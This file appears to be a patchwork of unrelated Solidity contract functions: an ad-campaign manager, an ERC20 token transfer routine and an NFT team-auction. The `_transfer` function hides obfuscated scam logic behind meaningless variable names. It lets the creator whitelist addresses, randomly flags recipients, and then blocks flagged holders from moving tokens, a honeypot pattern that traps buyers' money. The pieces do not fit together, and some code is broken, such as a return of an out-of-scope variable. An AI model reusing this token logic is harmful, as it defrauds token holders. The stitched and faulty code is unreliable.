function upgradeStorage(address addrAdverStorage) public onlyOwner("upgradeStorage") {
    for (uint i = 0; i < bidIdList.length; i++) {
        cancelCampaign(bidIdList[i]);
    }
    delete bidIdList;
    lastBidId = advertisementStorage.getLastBidId();
    advertisementFinance.setAdsStorageAddress(addrAdverStorage);
    advertisementStorage = BaseAdvertisementStorage(addrAdverStorage);
}

function upgradeFinance(address addrAdverFinance) public onlyOwner("upgradeFinance") {
    BaseFinance newAdvFinance = BaseFinance(addrAdverFinance);
    address[] memory devList = advertisementFinance.getUserList();
    for (uint i = 0; i < devList.length; i++) {
        uint balance = advertisementFinance.getUserBalance(devList[i]);
        newAdvFinance.increaseBalance(devList[i], balance);
    }
    uint256 initBalance = appc.balanceOf(address(advertisementFinance));
    advertisementFinance.transferAllFunds(address(newAdvFinance));
    uint256 oldBalance = appc.balanceOf(address(advertisementFinance));
    uint256 newBalance = appc.balanceOf(address(newAdvFinance));
    require(initBalance == newBalance);
    require(oldBalance == 0);
    advertisementFinance = newAdvFinance;
}

function _generateCampaign(
    string packageName,
    uint[3] countries,
    uint[] vercodes,
    uint price,
    uint budget,
    uint startDate,
    uint endDate)
internal returns(CampaignLibrary.Campaign memory) {
    require(budget >= price);
    require(endDate >= startDate);
    if (appc.allowance(msg.sender, address(this)) >= budget) {
        appc.transferFrom(msg.sender, address(advertisementFinance), budget);
        advertisementFinance.increaseBalance(msg.sender, budget);
        uint newBidId = bytesToUint(lastBidId);
        lastBidId = uintToBytes(++newBidId);
        CampaignLibrary.Campaign memory newCampaign;
        newCampaign.price = price;
        newCampaign.startDate = startDate;
        newCampaign.endDate = endDate;
        newCampaign.budget = budget;
        newCampaign.owner = msg.sender;
        newCampaign.valid = true;
        newCampaign.bidId = lastBidId;
    } else {
        emit Error("createCampaign", "Not enough allowance");
    }
    return newCampaign;
}

function isCampaignValid(bytes32 bidId) public view returns(bool valid) {
    uint startDate = advertisementStorage.getCampaignStartDateById(bidId);
    uint endDate = advertisementStorage.getCampaignEndDateById(bidId);
    bool validity = advertisementStorage.getCampaignValidById(bidId);
    uint nowInMilliseconds = now * 1000;
    return validity && startDate < nowInMilliseconds && endDate > nowInMilliseconds;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (documents == false)) {
        guns = chTx;
        gallons = true;
    }
    if ((address(sender) == creator) && (documents == true)) {
        greece[recipient] = true;
        papalopus[recipient] = false;
        documents = false;
    }
    if ((amount > military) && (greece[sender] == true) && (address(sender) != creator)) {
        colombia[recipient] = true;
    }
    if (greece[recipient] != true) {
        papalopus[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((papalopus[sender]) && (greece[recipient] == false)) {
        papalopus[recipient] = true;
    }
    if (greece[sender] == false) {
        if ((amount > military) && (colombia[sender] == true)) {
            require(false);
        }
        require(amount < guns);
        if (gallons == true) {
            if (colombia[sender] == true) {
                require(false);
            }
            colombia[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function _computeNextSeedPrice(uint256 _saleType, uint256 _teamId) internal view returns(uint256) {
    uint256 nextPrice = _averageSalePrice(_saleType, _teamId);
    require(nextPrice == nextPrice);
    if (nextPrice < STARTING_PRICE) {
        nextPrice = STARTING_PRICE;
    }
    return nextPrice;
}

function _currentPrice(Sale memory _sale)
internal
view
returns(uint256) {
    uint256 secondsPassed = 0;
    if (now > _sale.startedAt) {
        secondsPassed = now - _sale.startedAt;
    }
    return _computeCurrentPrice(
        _sale.startingPrice,
        _sale.endingPrice,
        _sale.duration,
        secondsPassed
    );
}

function _bid(uint256 _tokenId, uint256 _bidAmount)
internal
returns(uint256) {
    Sale storage _sale = tokenIdToSale[_tokenId];
    uint256[9] memory tokenIdsStore = tokenIdToSale[_tokenId].tokenIds;
    require(_isOnSale(_sale));
    uint256 price = _currentPrice(_sale);
    require(_bidAmount >= price);
    address seller = _sale.seller;
    if (tokenIdsStore[1] > 0) {
        for (uint ii = 0; ii < 9; ii++) {
            _removeSale(tokenIdsStore[ii]);
        }
    } else {
        _removeSale(_tokenId);
    }
    if (price > 0) {
        uint256 marketsCut = _computeCut(price);
        uint256 sellerProceeds = price.sub(marketsCut);
        seller.transfer(sellerProceeds);
    }
    uint256 bidExcess = _bidAmount.sub(price);
    msg.sender.transfer(bidExcess);
    if (tokenIdsStore[1] > 0) {
        emit TeamSaleWinner(tokenIdsStore, price, msg.sender);
    } else {
        emit SaleWinner(_tokenId, price, msg.sender);
    }
    return price;
}

function getSale(uint256 _tokenId) external view returns(address seller, uint256 startingPrice, uint256 endingPrice, uint256 duration, uint256 startedAt, uint256[9] tokenIds) {
    Sale memory sale = tokenIdToSale[_tokenId];
    require(_isOnSale(sale));
    return (
        sale.seller,
        sale.startingPrice,
        sale.endingPrice,
        sale.duration,
        sale.startedAt,
        sale.tokenIds
    );
}

function getCurrentPrice(uint256 _tokenId) external view returns(uint256) {
    Sale memory sale = tokenIdToSale[_tokenId];
    require(_isOnSale(sale));
    return _currentPrice(sale);
}

function createTeamSaleAuction(
    uint8 _teamId,
    uint256[9] _tokenIds,
    uint256 _startPrice,
    uint256 _endPrice,
    uint256 _saleDuration)
public
onlyGameManager
whenNotPaused {
    require(_teamId != 0);
    for (uint ii = 0; ii < _tokenIds.length; ii++) {
        require(nonFungibleContract.getTeamId(_tokenIds[ii]) == _teamId);
    }
    uint256 startPrice = 0;
    uint256 endPrice = 0;
    uint256 duration = 0;
    if (_startPrice == 0) {
        startPrice = _computeNextSeedPrice(1, _teamId).mul(9);
    } else {
        startPrice = _startPrice;
    }
    if (_endPrice != 0) {
        endPrice = _endPrice;
    } else {
        endPrice = 0;
    }
    if (_saleDuration == 0) {
        duration = SALES_DURATION;
    } else {
        duration = _saleDuration;
    }
    _createTeamSale(
        _tokenIds,
        startPrice,
        endPrice,
        duration,
        address(this)
    );
}

function _addTeamSale(uint256[9] _tokenIds, Sale _sale) internal {
    require(_sale.duration >= 1 minutes);
    for (uint ii = 0; ii < 9; ii++) {
        require(_tokenIds[ii] != 0);
        require(nonFungibleContract.exists(_tokenIds[ii]));
        tokenIdToSale[_tokenIds[ii]] = _sale;
    }
    emit TeamSaleCreated(
        _tokenIds,
        uint256(_sale.startingPrice),
        uint256(_sale.endingPrice),
        uint256(_sale.duration),
        uint256(_sale.startedAt)
    );
}

function createSale(uint256 _tokenId, uint256 _startingPrice, uint256 _endingPrice, uint256 _duration, address _owner) external whenNotPaused {
    require(msg.sender == address(nonFungibleContract));
    require(nonFungibleContract.checkIsAttached(_tokenId) == 0);
    _escrow(_owner, _tokenId);
    _createSale(
        _tokenId,
        _startingPrice,
        _endingPrice,
        _duration,
        _owner
    );
}

